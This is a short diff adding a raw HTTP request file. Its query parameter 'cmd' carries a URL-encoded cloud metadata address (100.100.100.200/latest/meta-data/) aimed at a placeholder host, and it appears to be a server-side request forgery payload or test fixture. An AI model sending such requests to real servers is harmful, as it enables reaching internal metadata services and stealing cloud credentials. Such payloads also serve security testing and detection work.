@@ -1,0 +1,4 @@
+GET /a?cmd=http%3A%2F%2F100.100.100.200%2Flatest%2Fmeta-data%2F HTTP/1.1
+Host: demo.example.com
+Connection: close
+
